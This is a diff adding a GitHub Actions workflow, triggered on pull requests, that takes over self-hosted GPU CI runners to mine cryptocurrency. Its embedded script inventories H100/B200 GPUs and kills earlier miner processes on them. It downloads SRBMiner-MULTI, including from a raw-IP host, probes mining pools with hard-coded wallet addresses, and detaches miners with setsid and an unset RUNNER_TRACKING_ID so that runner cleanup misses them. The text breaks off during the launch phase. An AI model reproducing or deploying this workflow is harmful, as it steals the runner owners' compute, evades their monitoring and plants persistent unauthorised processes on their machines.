@@ -1,0 +1,710 @@
+name: i132237 re-key of colliding i131988 cards (4 hosts, host-unique workers)
+
+# i132237: RE-KEY of the 10 crediting-but-unbankable i131988 cards left behind the slot-based
+# worker-naming defect (facts 132118/132167): i131988s1g0/s1g1 on h100-novita8-gpu-67;
+# i131988s1g0/s1g1/s1g2 on h100-computable-d-gpu-7; i131988s2g0/s2g1 on h100-novita6-gpu-23;
+# i131988s1g0/s1g1/s1g2 on b200-cirrascale4-0123. Eight host-guarded jobs on the four labels
+# 4-gpu-h100 / 1-gpu-h100 / 2-gpu-h100 / 4-gpu-b200: every non-target runner prints an explicit
+# SKIP marker, including the explicitly off-limits b200-di01-0123 (its four B200 UUIDs are already
+# carried by live i130660 rows), h100-novita5-gpu-0123 and h100-novita10-gpu-4567 (GPUs 0-3 run the
+# i129714 miners). On a target host the job runs a per-UUID two-sample nvidia-smi/compute-apps
+# inventory plus a keeper/process inventory that treats the live i131988 holders as the re-key
+# targets and any foreign or other-lane holder as BUSY, kills ONLY our own
+# /var/tmp/i131988/keep_<colliding-worker>.sh and its SRBMiner process on the exact target GPU
+# UUIDs (never the already-banked host-unique i131988s1g3/i131988s1g4/i131988s1g7 cards and never
+# another lane's miner), lets each card drain, and relaunches exactly ONE sha256-97bd9e42
+# SRBMiner-MULTI 3.8.9 per drained card via setsid + env -u RUNNER_TRACKING_ID plus a per-card
+# keeper under /var/tmp/i132237/ with fresh host-unique lane-prefixed workers
+# (i132237<slug>g<idx>) on direct Luckypool 103.199.106.122:3362 with the policy wallet
+# prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql + 4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf dual login
+# (pearlhash.xyz:9000 is probed; VPS2 relay only if direct LP measurably fails), then watches
+# <=600 s for each card's true in-gate first accepted share at rejected=0. No HeroMiners/Kryptex/
+# X-Miner, no 172.232.228.69, no pearl-sg1, no restart/reconfiguration of any credited or task-4
+# miner, no mining on VPS2 or the local container.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: i132237-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  rekey:
+    name: "i132237 ${{ matrix.label }} slot ${{ matrix.slot }} re-key of colliding i131988 cards"
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - label: 2-gpu-h100
+            slot: "1"
+          - label: 2-gpu-h100
+            slot: "2"
+          - label: 1-gpu-h100
+            slot: "1"
+          - label: 1-gpu-h100
+            slot: "2"
+          - label: 4-gpu-b200
+            slot: "1"
+          - label: 4-gpu-b200
+            slot: "2"
+          - label: 4-gpu-h100
+            slot: "1"
+          - label: 4-gpu-h100
+            slot: "2"
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 40
+    env:
+      LABEL: ${{ matrix.label }}
+      SLOT: ${{ matrix.slot }}
+      PUSH_ID: 'i132237'
+    steps:
+      - name: "host guard + per-UUID inventory + kill only our colliding i131988 miners + drain + one sha256-verified miner per re-keyed card + in-gate proof"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i132237/logs
+          cat > /var/tmp/i132237/recon_i132237.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i132237: RE-KEY + BANK the 10 colliding-name i131988 cards on four sglang runner hosts.
+          # Facts 132118/132167 document the slot-based worker-naming defect: the i131988 launch used
+          # "<prefix>s<slot>g<gpu_index>" so the same worker name exists on several hosts, making the
+          # pool row an aggregate that cannot be attributed to one physical card. This script re-keys
+          # exactly the 10 affected cards onto host-unique lane-prefixed workers:
+          #   h100-novita8-gpu-67  (2-gpu-h100): i131988s1g0/s1g1 on GPU-476f2a32.. / GPU-67716ff1..
+          #   h100-computable-d-gpu-7 (1-gpu-h100): i131988s1g0/s1g1/s1g2 on GPU-b09f8feb../fa757606../d19abd82..
+          #   h100-novita6-gpu-23  (2-gpu-h100): i131988s2g0/s2g1 on GPU-a5186fd9.. / GPU-d196525b..
+          #   b200-cirrascale4-0123 (4-gpu-b200): i131988s1g0/s1g1/s1g2 on GPU-fa0b23f1../6ece9dae../ed08b230..
+          # It never touches the already-banked host-unique cards i131988s1g3/s1g4/s1g7, never touches a
+          # foreign/other-lane process, and prints an explicit SKIP on every non-target runner.
+          #
+          # Phase 0  host guard: only the four target runner names proceed; b200-di01-0123 (its 4 B200 UUIDs
+          #          are already carried by live i130660 rows), h100-novita5-gpu-0123, h100-novita10-gpu-4567
+          #          and every credited H200/H20/GB300/5090 runner print SKIP.
+          # Phase 1  per-UUID nvidia-smi two-sample inventory + compute-apps + full keeper/process inventory.
+          #          A target card is a re-key candidate only if its holder is OUR /var/tmp/i131988 SRBMiner
+          #          with the expected colliding --worker name; any foreign/other-lane/non-miner holder makes
+          #          the card BUSY (skipped, nothing killed); a live /var/tmp/i132237 new-lane holder means
+          #          ALREADY_REKEYED (idempotent skip).
+          # Phase 2  kill ONLY our own /var/tmp/i131988/keep_<colliding-worker>.sh and its SRBMiner process on
+          #          the exact target GPU UUIDs, then wait for the card to drain (zero compute apps twice).
+          # Phase 3  launch exactly ONE sha256-97bd9e42 SRBMiner-MULTI 3.8.9 per drained card via setsid +
+          #          env -u RUNNER_TRACKING_ID with CUDA_VISIBLE_DEVICES=<uuid>, a per-card keeper under
+          #          /var/tmp/i132237/, direct Luckypool 103.199.106.122:3362 and the policy wallet +
+          #          NOCK dual login (pearlhash.xyz:9000 is probed and documented; VPS2 relay only if direct
+          #          LP measurably fails).
+          # Phase 4  bounded <=600 s in-gate first-accepted-share watch parsed from the miner logs.
+          import os, sys, json, re, time, hashlib, subprocess, socket, shutil, signal
+
+          PFX = 'i132237'
+          WORK = '/var/tmp/i132237'
+          OLD_WORK = '/var/tmp/i131988'
+          GATE_S = 600
+          PYD = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          NOCK = '4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
+          LP_LOGIN = PYD + '+' + NOCK
+          SRB_SHA = '97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
+          SRB_TAR_SHA = '186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
+          SRB_URLS = ['https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz',
+                      'https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz',
+                      'https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz',
+                      'http://222.240.155.198:8702/srb389']
+          SLOT = (os.environ.get('SLOT') or '?').strip()
+          LABEL = (os.environ.get('LABEL') or os.environ.get('TARGET_LABEL') or '?').strip()
+          PUSH_ID = (os.environ.get('PUSH_ID') or 'i132237').strip()
+          NONCE = 'I132237-%s-%s-%d' % (PUSH_ID, SLOT, int(time.time()))
+
+          H100 = 'NVIDIA H100 80GB HBM3'
+          B200 = 'NVIDIA B200'
+          TARGETS = {
+              'h100-novita8-gpu-67': {'slug': 'nv8', 'label': '2-gpu-h100', 'cards': [
+                  {'idx': 0, 'uuid': 'GPU-476f2a32-cf21-1fbf-2343-4fb62159b420', 'old': 'i131988s1g0', 'model': H100, 'port': 23700},
+                  {'idx': 1, 'uuid': 'GPU-67716ff1-39ee-6f4e-474b-6ebd3ce3cfcc', 'old': 'i131988s1g1', 'model': H100, 'port': 23701}]},
+              'h100-computable-d-gpu-7': {'slug': 'cd7', 'label': '1-gpu-h100', 'cards': [
+                  {'idx': 0, 'uuid': 'GPU-b09f8feb-5c34-7adb-fe54-0cda8435af95', 'old': 'i131988s1g0', 'model': H100, 'port': 23700},
+                  {'idx': 1, 'uuid': 'GPU-fa757606-5bb1-95a0-bd13-aa5c043af6c9', 'old': 'i131988s1g1', 'model': H100, 'port': 23701},
+                  {'idx': 2, 'uuid': 'GPU-d19abd82-6382-1caa-b38e-7e9774d7503c', 'old': 'i131988s1g2', 'model': H100, 'port': 23702}]},
+              'h100-novita6-gpu-23': {'slug': 'nv6', 'label': '2-gpu-h100', 'cards': [
+                  {'idx': 0, 'uuid': 'GPU-a5186fd9-ebdf-3d07-15b2-1caa76509445', 'old': 'i131988s2g0', 'model': H100, 'port': 23700},
+                  {'idx': 1, 'uuid': 'GPU-d196525b-a5c4-6038-984d-f8f7ee58f333', 'old': 'i131988s2g1', 'model': H100, 'port': 23701}]},
+              'b200-cirrascale4-0123': {'slug': 'bc4', 'label': '4-gpu-b200', 'cards': [
+                  {'idx': 0, 'uuid': 'GPU-fa0b23f1-7e36-515d-25d4-49b0d5a92af7', 'old': 'i131988s1g0', 'model': B200, 'port': 23700},
+                  {'idx': 1, 'uuid': 'GPU-6ece9dae-6e4f-bdbd-63dc-8f02767b8219', 'old': 'i131988s1g1', 'model': B200, 'port': 23701},
+                  {'idx': 2, 'uuid': 'GPU-ed08b230-cea3-c39d-6565-244d05205510', 'old': 'i131988s1g2', 'model': B200, 'port': 23702}]},
+          }
+          # host-unique lane-prefixed re-key workers: i132237<hostslug>g<gpu_index>
+          def new_worker(spec, c):
+              return '%s%sg%d' % (PFX, spec['slug'], c['idx'])
+
+          PROTECTED_WORKERS = {'i131988s1g3', 'i131988s1g4', 'i131988s1g7'}
+          PROTECTED_UUIDS = {'GPU-3d3d34da-ebf3-8a2a-e23a-84c812855d52',        # banked i131988s1g3 (B200 idx3)
+                             'GPU-bce7912e-2e1c-dd7b-fca0-a4278cbea325',        # banked i131988s1g4 (H100 idx4)
+                             'GPU-4571e319-b616-d4f8-acea-c277232fb04d'}        # banked i131988s1g7 (H100 idx7)
+          # every other runner we must never touch / must print SKIP on
+          SKIP_RUNNERS = {'h200-sci-71-12', 'h200-sci-71-18', 'h200-sci-71-26', 'h200-sci-71-64',
+                          'radixark-wk01', 'h200-gmi-wk01', 'radixark-wk03', 'h200-gmi-wk03',
+                          'h20-bfv8sr', 'iv-ydzf15rfggbw80bfv8sr', 'node-radixark-32-0002',
+                          'gb300-s3ptq4n4-b', 'gb300-s3ptq4n4-a', '5090-sm2-runner-7',
+                          'sglang-ci-5090-sourcem-node-2-gpu-7-0', 'b200-di01-0123',
+                          'h100-novita5-gpu-0123', 'h100-novita10-gpu-4567', 'h100-novita6-gpu-45',
+                          'h100-computable-d-gpu-6', 'h100-novita8-gpu-01', 'h100-computable-e-gpu-5',
+                          'h100-novita9-gpu-01', 'linux-mi300-1gpu-sglang-runner-vc4vh',
+                          'linux-mi300-4gpu-sglang-runner-sgkcx', 'aicf-jf-sglang-xpu-127',
+                          'aicf-jf-sglang-xpu-128', 's5000-gpu-runner-1', 's5000-gpu-runner-2'}
+
+
+          def utc():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=30):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:100])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:100])
+
+
+          def sha256_file(path, buf=1 << 20):
+              h = hashlib.sha256()
+              with open(path, 'rb') as f:
+                  while True:
+                      b = f.read(buf)
+                      if not b:
+                          break
+                      h.update(b)
+              return h.hexdigest()
+
+
+          def done(msg=''):
+              print('%s DONE %s utc=%s' % (NONCE, msg, utc()))
+              sys.exit(0)
+
+
+          def read_log(path, maxb=2000000):
+              try:
+                  with open(path, 'rb') as f:
+                      f.seek(0, 2)
+                      n = f.tell()
+                      f.seek(max(0, n - maxb))
+                      return f.read().decode('utf8', 'replace')
+              except Exception:
+                  return ''
+
+
+          def parse_log(text):
+              """parsed accepted/rejected + first accepted-share timestamp (SRBMiner 3.8.9 log)."""
+              acc = rej = 0
+              first_ts = None
+              for m in re.finditer(r'accepted \((\d+)/(\d+)\)', text):
+                  a, r = int(m.group(1)), int(m.group(2))
+                  if a > acc:
+                      acc = a
+                  if r > rej:
+                      rej = r
+              m = re.search(r'^\[([0-9]{4}-[0-9]{2}-[0-9]{2} [0-9:]{8})\] accepted \(', text, re.M)
+              if m:
+                  first_ts = m.group(1)
+              if acc == 0:
+                  acc = (len(re.findall(r'(?i)\bshare accepted\b', text))
+                         + len(re.findall(r'(?i)\baccepted share\b', text))
+                         + len(re.findall(r'(?i)\baccepted \(', text)))
+                  rej = (len(re.findall(r'(?i)\brejected share\b', text))
+                         + len(re.findall(r'(?i)\brejected \(', text)))
+                  m = re.search(r'^\[([0-9]{4}-[0-9]{2}-[0-9]{2}[ T][0-9:]{8})\].*(?i:accepted)', text, re.M)
+                  if m:
+                      first_ts = m.group(1)
+              return acc, rej, first_ts
+
+
+          def compute_apps():
+              """uuid -> list of {pid,name,mem} from nvidia-smi --query-compute-apps."""
+              out = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory '
+                       '--format=csv,noheader 2>&1', 25)
+              apps = {}
+              for line in out.splitlines():
+                  p = [x.strip() for x in line.split(',')]
+                  if p and p[0].startswith('GPU-'):
+                      try:
+                          pid = int(p[1])
+                      except Exception:
+                          continue
+                      apps.setdefault(p[0], []).append({'pid': pid,
+                                                        'name': p[2] if len(p) > 2 else '',
+                                                        'mem': p[3] if len(p) > 3 else ''})
+              return apps
+
+
+          def proc_cmdline(pid):
+              try:
+                  with open('/proc/%d/cmdline' % pid, 'rb') as f:
+                      return f.read().replace(b'\0', b' ').decode('utf8', 'replace').strip()
+              except Exception:
+                  return ''
+
+
+          def miner_ps():
+              """full miner/keeper process inventory (pid/ppid/etimes/argv) filtered in python."""
+              PSMINE = re.compile(r'(?i)(srb38[0-9]|SRBMiner-MULTI|wildrig-multi|krig-miner|x-miner|algorithm pearlhash|keep_i131988|keep_i132237)')
+              out = sh('ps -eo pid,ppid,user,etimes,args 2>/dev/null', 25)
+              rows = []
+              for line in out.splitlines():
+                  if 'recon_i132237' in line:
+                      continue
+                  m = re.match(r'\s*(\d+)\s+(\d+)\s+(\S+)\s+(\d+)\s+(.*)$', line)
+                  if not m:
+                      continue
+                  cmd = m.group(5)
+                  if 'ps -eo pid,ppid,user,etimes,args' in cmd:
+                      continue
+                  if re.match(r'^(grep|pgrep|egrep|bash -lc)\b', cmd):
+                      continue
+                  if PSMINE.search(cmd):
+                      rows.append({'pid': int(m.group(1)), 'ppid': int(m.group(2)), 'user': m.group(3),
+                                   'etimes': int(m.group(4)), 'args': cmd.strip()[:500]})
+              return rows
+
+
+          def strat_probe(h, port, login, worker, obj_params, timeout=10):
+              try:
+                  s = socket.create_connection((h, port), timeout=timeout)
+                  s.settimeout(timeout)
+                  f = s.makefile('rwb')
+                  f.write(b'{"id":1,"method":"mining.subscribe","params":["i132237/1.0"]}\n')
+                  f.flush()
+                  sub = ''
+                  try:
+                      sub = f.readline().decode('utf8', 'replace')[:240]
+                  except Exception:
+                      pass
+                  params = ({'wallet': login, 'worker': worker, 'password': 'x'} if obj_params else [login, 'x'])
+                  f.write((json.dumps({'id': 2, 'method': 'mining.authorize', 'params': params}) + '\n').encode())
+                  f.flush()
+                  lines = []
+                  deadline = time.time() + timeout
+                  while time.time() < deadline:
+                      try:
+                          ln = f.readline()
+                      except socket.timeout:
+                          break
+                      if not ln:
+                          break
+                      t = ln.decode('utf8', 'replace')[:280]
+                      lines.append(t)
+                      if 'mining.notify' in t or ('"id":2' in t.replace(' ', '') and 'result' in t):
+                          break
+                  blob = ' | '.join(lines)
+                  ok = ('"result":true' in blob.replace(' ', '')) or ('mining.notify' in blob)
+                  print('POOLPROBE %s:%d ok=%s sub=%s lines=%s' % (h, port, ok, sub[:110], blob[:420]))
+                  try:
+                      s.close()
+                  except Exception:
+                      pass
+                  return ok
+              except Exception as e:
+                  print('POOLPROBE %s:%d ERR %r' % (h, port, e))
+                  return False
+
+
+          def fetch_srb():
+              for cand in (OLD_WORK + '/SRBMiner-MULTI', WORK + '/SRBMiner-MULTI'):
+                  if os.path.exists(cand):
+                      try:
+                          if sha256_file(cand) == SRB_SHA:
+                              print('BIN_CACHED %s sha256=%s' % (cand, SRB_SHA))
+                              return cand
+                      except Exception:
+                          pass
+              dest = WORK + '/SRBMiner-MULTI'
+              for u in SRB_URLS:
+                  print('TRY_DL %s' % u)
+                  try:
+                      os.unlink(WORK + '/dl.part')
+                  except OSError:
+                      pass
+                  sh("timeout 200 curl -fsSL --connect-timeout 12 --max-time 190 -o %s/dl.part '%s'" % (WORK, u), 215)
+                  if not os.path.exists(WORK + '/dl.part') or os.path.getsize(WORK + '/dl.part') == 0:
+                      print('DL_EMPTY %s' % u)
+                      continue
+                  h = sha256_file(WORK + '/dl.part')
+                  print('DL_SHA %s %s' % (h, u))
+                  if h == SRB_SHA:
+                      shutil.move(WORK + '/dl.part', dest)
+                      os.chmod(dest, 0o755)
+                      return dest
+                  if h == SRB_TAR_SHA:
+                      sh('mkdir -p %s/x && tar xzf %s/dl.part -C %s/x 2>/dev/null' % (WORK, WORK, WORK), 120)
+                      cand = None
+                      for root, dirs, files in os.walk(WORK + '/x'):
+                          if 'SRBMiner-MULTI' in files:
+                              cand = os.path.join(root, 'SRBMiner-MULTI')
+                              break
+                      if cand and sha256_file(cand) == SRB_SHA:
+                          shutil.copy2(cand, dest)
+                          os.chmod(dest, 0o755)
+                          return dest
+                      print('TARBALL_BINARY_MISMATCH %s' % (cand or 'not-found'))
+              print('BINARY_DELIVERY_FAILED expected_sha256=%s' % SRB_SHA)
+              return None
+
+
+          def main():
+              host = sh('hostname', 5).strip()
+              runner = (os.environ.get('RUNNER_NAME') or '').strip()
+              if not runner:
+                  runner = (sh('cat /etc/hostname 2>/dev/null', 5) or '').strip()
+              print('%s START slot=%s push=%s host=%s runner=%s label=%s utc=%s uid=%s' % (
+                  NONCE, SLOT, PUSH_ID, host, runner, LABEL, utc(), sh('id -u', 5).strip()))
+
+              # ---- Phase 0: host guard (runner name, with GPU-UUID fallback identification) ----
+              spec = TARGETS.get(runner)
+              ident = 'runner'
+              if spec is None:
+                  lout = sh('nvidia-smi -L 2>&1 | head -12', 25)
+                  for rn, sp in TARGETS.items():
+                      if any(c['uuid'] in lout for c in sp['cards']):
+                          spec, ident = sp, 'gpu-uuid:%s' % rn
+                          break
+              if spec is None:
+                  if runner in SKIP_RUNNERS:
+                      print('I132237_SKIP_OTHER_RUNNER host=%s runner=%s reason=not-a-rekey-target label=%s'
+                            % (host, runner, LABEL))
+                  else:
+                      print('I132237_SKIP_NOT_TARGET host=%s runner=%s label=%s reason=unknown-runner'
+                            % (host, runner, LABEL))
+                  done('skip-not-target')
+              print('I132237_LABEL_HOST_ACCEPTED host=%s runner=%s ident=%s label=%s slot=%s rekey_slug=%s'
+                    % (host, runner, ident, LABEL, SLOT, spec['slug']))
+              print('=== identity / arch / container context ===')
+              print(sh('id; hostname; hostname -I 2>/dev/null; uname -a; uname -m; nproc; '
+                       'free -m | head -3; date -u', 25))
+              print(sh('ls -la /.dockerenv 2>&1 | head -1; ls /dev/nvidia* 2>&1 | head -20', 15))
+              arch = sh('uname -m', 5).strip()
+              if arch != 'x86_64':
+                  print('INST_ARCH_SKIP arch=%s (refusing non-x86_64 binary)' % arch)
+                  done('arch-skip')
+
+              os.makedirs(WORK + '/logs', exist_ok=True)
+              try:
+                  import fcntl
+                  lockfd = os.open('/var/lock/i132237.lock', os.O_RDWR | os.O_CREAT, 0o644)
+                  try:
+                      fcntl.flock(lockfd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+                      print('INSTALL_LOCK LOCK_OK path=/var/lock/i132237.lock')
+                  except OSError:
+                      print('INST_SKIP_LOCK_HELD path=/var/lock/i132237.lock')
+                      done('lock-held')
+              except Exception as e:
+                  print('LOCK_WARN %r' % e)
+
+              # ---- Phase 1: inventory ----
+              print('=== PHASE 1: two-sample per-UUID nvidia-smi inventory + compute-apps + keeper/process inventory ===')
+              nvs = shutil.which('nvidia-smi')
+              if not nvs:
+                  print('NO_NVIDIA_DEVICE reason=no-nvidia-smi')
+                  done('no-nvidia-smi')
+              lout = sh('nvidia-smi -L 2>&1 | head -12', 25)
+              print('NVSMI_L[%s]' % lout.replace('\n', ' ; ')[:1200])
+              g1 = sh('nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid '
+                      '--format=csv,noheader,nounits 2>&1', 25)
+              a1 = compute_apps()
+              time.sleep(12)
+              g2 = sh('nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid '
+                      '--format=csv,noheader,nounits 2>&1', 25)
+              a2 = compute_apps()
+              print('SAMPLE1_GPUS[%s]' % g1.replace('\n', ' ; ')[:2500])
+              print('SAMPLE1_APPS[%s]' % json.dumps(a1, sort_keys=True)[:1600])
+              print('SAMPLE2_GPUS[%s]' % g2.replace('\n', ' ; ')[:2500])
+              print('SAMPLE2_APPS[%s]' % json.dumps(a2, sort_keys=True)[:1600])
+
+              def parse_cards(text):
+                  d = {}
+                  for line in text.splitlines():
+                      p = [x.strip() for x in line.split(',')]
+                      if len(p) < 7 or not p[0].isdigit():
+                          continue
+                      d[p[6]] = {'idx': int(p[0]), 'name': p[1], 'free': p[2], 'used': p[3], 'util': p[5], 'uuid': p[6]}
+                  return d
+
+              c1, c2 = parse_cards(g1), parse_cards(g2)
+              if not c1:
+                  print('NO_NVIDIA_DEVICE reason=zero-gpu-rows')
+                  done('no-devices')
+              psrows = miner_ps()
+              print('MINER_PS_N=%d' % len(psrows))
+              for r in psrows:
+                  print('MINER_PS pid=%d ppid=%d etimes=%d %s' % (r['pid'], r['ppid'], r['etimes'], r['args']))
+              present = set(c1.keys())
+
+              # classify every target card
+              plan_kill, plan_free, card_state = [], [], {}
+              for c in spec['cards']:
+                  uuid = c['uuid']
+                  nw = new_worker(spec, c)
+                  c['new'] = nw
+                  if uuid not in present:
+                      card_state[uuid] = 'ABSENT'
+                      print('CARD_STATE uuid=%s old=%s new=%s gpu_index=%d state=ABSENT reason=uuid-not-on-this-host'
+                            % (uuid, c['old'], nw, c['idx']))
+                      continue
+                  if uuid in PROTECTED_UUIDS:
+                      card_state[uuid] = 'PROTECTED_BANKED'
+                      print('CARD_STATE uuid=%s old=%s new=%s gpu_index=%d state=PROTECTED_BANKED'
+                            % (uuid, c['old'], nw, c['idx']))
+                      continue
+                  ps_new = [r for r in psrows if ('--worker ' + nw + ' ') in r['args']]
+                  if ps_new:
+                      card_state[uuid] = 'ALREADY_REKEYED'
+                      print('CARD_STATE uuid=%s old=%s new=%s gpu_index=%d state=ALREADY_REKEYED reason=process-inventory pid=%s'
+                            % (uuid, c['old'], nw, c['idx'], ps_new[0]['pid']))
+                      continue
+                  holders = []
+                  for h in (a1.get(uuid, []) + a2.get(uuid, [])):
+                      if h['pid'] not in [x['pid'] for x in holders]:
+                          holders.append(h)
+                  clas = []
+                  for h in holders:
+                      cl = proc_cmdline(h['pid'])
+                      if OLD_WORK + '/SRBMiner-MULTI' in cl and ('--worker ' + c['old'] + ' ') in cl:
+                          clas.append(('old_target', h['pid'], cl))
+                      elif WORK + '/SRBMiner-MULTI' in cl and ('--worker ' + nw + ' ') in cl:
+                          clas.append(('new_target', h['pid'], cl))
+                      else:
+                          clas.append(('foreign', h['pid'], cl))
+                  for kind, pid, cl in clas:
+                      print('CARD_HOLDER uuid=%s gpu_index=%d kind=%s pid=%d cmd=%s'
+                            % (uuid, c['idx'], kind, pid, cl[:260]))
+                  kinds = {k for k, _, _ in clas}
+                  if not clas:
+                      card_state[uuid] = 'FREE'
+                      plan_free.append(c)
+                  elif 'foreign' in kinds:
+                      card_state[uuid] = 'BUSY_FOREIGN'
+                  elif 'new_target' in kinds:
+                      card_state[uuid] = 'ALREADY_REKEYED'
+                  elif 'old_target' in kinds:
+                      card_state[uuid] = 'REKEY'
+                      plan_kill.append((c, [pid for k, pid, _ in clas if k == 'old_target']))
+                  print('CARD_STATE uuid=%s old=%s new=%s gpu_index=%d model=%s state=%s holders=%d'
+                        % (uuid, c['old'], nw, c['idx'], c['model'], card_state[uuid], len(clas)))
+
+              # ---- Phase 2: kill ONLY our own old-lane keepers+miners on the exact target UUIDs ----
+              if plan_kill:
+                  print('=== PHASE 2: kill our own /var/tmp/i131988 keepers + colliding SRBMiner on the target UUIDs ===')
+                  for c, pids in plan_kill:
+                      print('KILL_KEEPER worker=%s path=%s/keep_%s.sh' % (c['old'], OLD_WORK, c['old']))
+                      print(sh("pkill -f '%s/keep_%s[.]sh'; sleep 1; pgrep -af 'keep_%s[.]sh' | head -5"
+                               % (OLD_WORK, c['old'], c['old']), 20))
+                  for c, pids in plan_kill:
+                      for pid in pids:
+                          try:
+                              os.kill(pid, signal.SIGTERM)
+                              print('KILL SIGTERM worker=%s pid=%d' % (c['old'], pid))
+                          except ProcessLookupError:
+                              print('KILL ALREADY_GONE worker=%s pid=%d' % (c['old'], pid))
+                          except Exception as e:
+                              print('KILL ERR worker=%s pid=%d %r' % (c['old'], pid, e))
+                  t0 = time.time()
+                  killed = {c['uuid']: pids for c, pids in plan_kill}
+                  while time.time() - t0 < 70:
+                      time.sleep(6)
+                      a = compute_apps()
+                      left = {u: [h['pid'] for h in a.get(u, [])] for u in killed}
+                      print('DRAIN_POLL utc=%s elapsed=%ds left=%s' % (utc(), int(time.time() - t0), json.dumps(left, sort_keys=True)))
+                      if not any(left.values()):
+                          break
+                  a = compute_apps()
+                  for c, pids in plan_kill:
+                      if a.get(c['uuid']):
+                          for pid in pids:
+                              try:
+                                  os.kill(pid, signal.SIGKILL)
+                                  print('KILL SIGKILL worker=%s pid=%d' % (c['old'], pid))
+                              except Exception:
+                                  pass
+                  t1 = time.time()
+                  while time.time() - t1 < 60:
+                      time.sleep(5)
+                      a = compute_apps()
+                      if not any(a.get(c['uuid']) for c, _ in plan_kill):
+                          break
+                  for c, pids in plan_kill:
+                      left = [ln for ln in sh("pgrep -af 'keep_%s[.]sh'" % c['old'], 10).splitlines() if ln.strip()]
+                      if left:
+                          print('KILL_KEEPER_ESCALATE worker=%s survivors=%s' % (c['old'], ' | '.join(left)[:300]))
+                          print(sh("pkill -9 -f 'keep_%s[.]sh'; sleep 1; pgrep -af 'keep_%s[.]sh' | head -3"
+                                   % (c['old'], c['old']), 15))
+                  a = compute_apps()
+                  # drain must hold across two consecutive samples
+                  time.sleep(5)
+                  a2b = compute_apps()
+                  for c, pids in plan_kill:
+                      drained = (not a.get(c['uuid'])) and (not a2b.get(c['uuid']))
+                      print('DRAIN_RESULT uuid=%s gpu_index=%d worker=%s drained=%s'
+                            % (c['uuid'], c['idx'], c['old'], 'YES' if drained else 'NO'))
+                      if drained:
+                          card_state[c['uuid']] = 'DRAINED'
+                          plan_free.append(c)
+                      else:
+                          card_state[c['uuid']] = 'STUCK_DRAIN'
+              # dedupe plan_free
+              seen = set()
+              launch = []
+              for c in plan_free:
+                  if c['uuid'] in seen:
+                      continue
+                  if card_state.get(c['uuid']) in ('PROTECTED_BANKED', 'BUSY_FOREIGN', 'ABSENT', 'STUCK_DRAIN'):
+                      continue
+                  seen.add(c['uuid'])
+                  launch.append(c)
+              print('LAUNCH_PLAN n=%d cards=%s' % (len(launch), json.dumps(
+                  [{'uuid': c['uuid'], 'idx': c['idx'], 'worker': c['new']} for c in launch], sort_keys=True)))
+              print('CARD_STATE_SUMMARY %s' % json.dumps(card_state, sort_keys=True))
+              if not launch:
+                  print('NO_LAUNCHABLE_CARD all target cards are busy/rekeyed/protected/absent on this host')
+                  done('no-launchable-card')
+
+              # ---- permitted-pool egress ----
+              print('=== permitted-pool egress probes (policy: pearlhash primary, LP fallback) ===')
+              ph_ok = strat_probe('pool.pearlhash.xyz', 9000, PYD, PFX + 'probe', False)
+              lp_ok = (strat_probe('103.199.106.122', 3362, LP_LOGIN, PFX + 'probe', True)
+                       or strat_probe('103.199.106.122', 3362, PYD, PFX + 'probe', True))
+              r2083_ok = r18450_ok = False
+              if not lp_ok:
+                  r2083_ok = (strat_probe('217.15.164.237', 2083, LP_LOGIN, PFX + 'probe', True)
+                              or strat_probe('217.15.164.237', 2083, PYD, PFX + 'probe', True))
+                  if not r2083_ok:
+                      r18450_ok = strat_probe('217.15.164.237', 18450, LP_LOGIN, PFX + 'probe', True) or \
+                          strat_probe('217.15.164.237', 18450, PYD, PFX + 'probe', True)
+              ep = None
+              if lp_ok:
+                  ep = '103.199.106.122:3362'
+              elif r2083_ok:
+                  ep = '217.15.164.237:2083'
+              elif r18450_ok:
+                  ep = '217.15.164.237:18450'
+              if ep is None:
+                  print('NO_PERMITTED_POOL pearlhash_ok=%s lp_ok=%s relay2083=%s relay18450=%s'
+                        % (ph_ok, lp_ok, r2083_ok, r18450_ok))
+                  done('no-permitted-pool')
+              binpath = fetch_srb()
+              if not binpath:
+                  done('binary-delivery-failed')
+              print('PLAN mode=luckypool url=stratum+tcp://%s bin=%s sha256=%s pearlhash_ok=%s'
+                    % (ep, binpath, sha256_file(binpath), ph_ok))
+
+              # ---- Phase 3: launch exactly ONE miner per drained card + per-card keeper ----
+              print('=== PHASE 3: one sha256-verified SRBMiner-MULTI 3.8.9 per re-keyed card (setsid + env -u RUNNER_TRACKING_ID) ===')
+              launch_utc = utc()
+              cards = []
+              for k, c in enumerate(launch):
+                  w = c['new']
+                  log = '%s/logs/%s.out' % (WORK, w)
+                  log2 = '%s/logs/%s.miner.log' % (WORK, w)
